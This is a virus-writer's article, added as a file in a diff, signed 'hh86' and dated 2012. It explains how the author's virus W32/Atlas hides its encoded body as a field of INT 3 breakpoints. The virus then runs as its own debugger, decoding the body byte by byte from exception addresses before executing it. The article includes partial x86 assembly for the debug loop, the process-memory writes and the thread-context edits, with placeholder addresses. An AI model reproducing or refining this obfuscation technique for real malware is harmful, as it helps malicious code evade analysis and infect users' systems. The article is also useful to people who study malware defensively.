@@ -1,0 +1,166 @@
+
+                             Debug Assisted
+                                Decoding
+                                By  hh86
+
+About Atlas
+
+This is an old project I had.   I worked on it one night a year ago but did
+not work on it any further. Source code was lost. But now I have a new one.
+This  is also a remake of W32/POSEY  (Peter Ferrie  called  it  W32/Tussie,
+see Virus Bulletin, August 2012).   I have no idea why they change the name
+to  my  code, but I call this one W32/Atlas.   It  is  my  first  virus  to 
+implement debugging techniques.
+
+
+Life, the Universe and...
+
+Sure  enough  we  all know  what a debugger is.   Sometimes  used with good 
+benefits, sometimes not enough. In Windows you can create your own debugger
+using a few powerful functions.
+
+In W32/POSEY, I implemented a tiny but  nice technique to obfuscate a virus
+by encoding it in instructions.  Specifically, I used CALLs and 256 INT 3s.
+All you need to do is calculate the distance from the beginning of an INT 3
+field  to  the  place  where an exception has just happened.   The distance
+represents  the  decoded byte.  This is possible because of Virtual Address
+Space, and Structured Exception Handling.
+
+This  technique  can be applied in 64-bit but you need to add an  Exception
+Directory to the file.
+
+In  order  to catch such exceptions, a custom (decoder) SEH  handler (which
+would gather the necessary data from exception records and context) is very
+required.   W32/Atlas is the same concept, but it is a debugger (and remote
+SEH handler).
+
+
+Debug Gravitation
+
+Atlas drops a PE file, with no code.     So it is just headers, we fill it
+with  code  during  the first steps of debugging.    Next, is to create the
+process in debug mode.
+
+If the process is successfully created we wait for a debug event to happen.
+
+        push    esi
+        push    esi
+        push    ebx
+        push    ebx
+        push    DEBUG_PROCESS
+        push    ebx
+        push    ebx
+        push    ebx
+        push    ebx
+        push    edi
+        call    CreateProcessA
+Step 1
+
+In fact, many will happen, but ignore them all, unless  it is an  exception
+event.
+
+The  first  exception  event  (if everything goes according to plan) should
+happen right before the system runs the code at debugee entrypoint.   Atlas
+checks an internal flag (boolean).      If the flag is not set, this is the
+first  exception, and  we must fill debugee's code section with the encoded 
+body, then we let this event pass with DBG_CONTINUE.  If  the flag was set,
+this could mean that we just hit an  INT 3 in the INT 3 field, we assume it
+did and proceed to decode. If the exception event was no breakpoint, we let
+it  pass  with  DBG_EXCEPTION_NOT_HANDLED, this  will  cause the process to
+crash, and go to step 3.
+
+init_dbg        label    near
+        push    TIMEWAIT
+        push    edi
+        call    WaitForDebugEvent
+        cmp     dword ptr [edi + DEBUG_EVENT.dwDebugEventCode], EXCEPTION_DEBUG_EVENT
+        jne     debug_pass
+        cmp     dword ptr [edi + DEBUG_EVENT.u.Exception.pExceptionRecord.ExceptionCode], EXCEPTION_BREAKPOINT
+        jne     debug_excp
+        cmp     ExceptionFlag, bl
+        jne     debug_stde
+        push    ebx
+        push    esp
+        push    "hh86"                       ;encoded body size
+        push    "hh86"                       ;encoded body address
+        push    401000h
+        push    dword ptr [esi + PROCESS_INFORMATION2.hProcess]
+        call    WriteProcessMemory
+        pop     eax
+        inc     ExceptionFlag
+
+debug_pass      label    near
+        push    DBG_CONTINUE
+
+debug_pstk      label    near
+        push    dword ptr [edi + DEBUG_EVENT.dwThreadId]
+        push    dword ptr [edi + DEBUG_EVENT.dwProcessId]
+        call    ContinueDebugEvent
+        dec     eax
+        jz      debug_event
+        ;finished debugging, do your checks here
+
+debug_excp      label    near
+        push    DBG_EXCEPTION_NOT_HANDLED
+        jmp     debug_pstk
+
+Step 2, tidal force.
+
+The  code  reads debugee's context, this is so we can get the current stack
+pointer.  We read the dword in the stack.   The dword is the address of the
+next CALL. We adjust in the context the EIP register to that address.  Then
+from the debug exception event  data  we  get  the  exception address, then
+substract  to  it the address of the INT 3 field.  Update debugee's context
+and let the event pass with DBG_CONTINUE.
+
+After every CALL is executed, a code (return to invalid address) will cause
+an exception other than  a  breakpoint, and in step 1 the debugger lets the
+debugee crash, and step 3 will be run.
+
+        mov     ecx, "hh86"                  ;address of CONTEXT buffer
+        mov     dword ptr [ecx + CONTEXT.ContextFlags], CONTEXT_FULL
+        mov     eax, dword ptr [esi + PROCESS_INFORMATION2.hThread]
+        push    ecx                          ;SetThreadContext
+        push    eax                          ;SetThreadContext
+        push    ecx
+        push    ecx
+        push    eax
+        call    GetThreadContext
+        pop     ecx
+        push    ebx
+        mov     edx, esp
+        push    ecx
+        push    ebx 
+        push    esp
+        push    sizeof CONTEXT.regEsp
+        push    edx
+        push    dword ptr [ecx + CONTEXT.regEsp]
+        push    dword ptr [esi + PROCESS_INFORMATION2.hProcess]
+        call    ReadProcessMemory
+        pop     eax
+        pop     ecx
+        pop     dword ptr [ecx + CONTEXT.regEip]
+        mov     eax, dword ptr [edi + DEBUG_EVENT.u.Exception.pExceptionRecord.ExceptionAddress]
+        sub     eax, "hh86"                  ;address of INT 3 field in child process virtual space
+        mov     edx, "hh86"                  ;address of our buffer for decoding
+        mov     byte ptr [edx], al
+        call    SetThreadContext
+        jmp     debug_pass
+
+Step 3
+
+This  is  just  a  simple  check, we check that the number of decoded bytes
+match  that  of the unencoded body size.  If it does not, we close handlers
+of the process and thread, and leave.   If it does, we assume that the body
+was correctly decoded and we run it.
+
+
+Outro
+
+It is so funny that most  viruses attempt to escape from debuggers and some
+use  the  functions to inject code into other process, but why do that when
+it is so funny to be a virus and a debugger at the same time? ;)
+
+hh86
+November 2012
+5f3bc5221626b2f8d66261fb073394{at}gmail.com
